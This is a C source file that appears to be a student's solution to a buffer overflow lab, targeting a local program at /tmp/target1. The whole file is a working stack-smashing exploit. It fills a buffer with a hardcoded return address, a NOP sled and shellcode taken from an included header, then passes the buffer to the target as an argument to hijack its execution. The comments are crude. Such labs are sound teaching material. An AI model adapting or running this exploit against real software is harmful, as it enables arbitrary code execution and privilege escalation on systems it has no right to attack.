#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

#define bro 0x90; // nop
#define doYouEvenLift 0x6dbffffd //buff start

//char overflow[128];

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

int main(void)
{
  char *args[3];
  char *env[1];
  
  int lb = 133;
  char buff[lb];
  int i;
  long * addr = (long *) buff;

  for (i = 0; i < lb/4; i++){
      *(addr + i) = (int) doYouEvenLift; 
  }

  // nop that hoe
  for (i = 0; i < lb/2; i++){
    *(buff + i) = bro;
  } 

  // sneaky sneaky
  for (i = 0; i < strlen(shellcode); i ++) {
    *(buff + i + lb/4) = shellcode[i];
  }
  buff[lb-1] = '\0';
  

  args[0] = TARGET; 
  args[1] = buff; 
  args[2] = NULL;
  env[0] = NULL;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
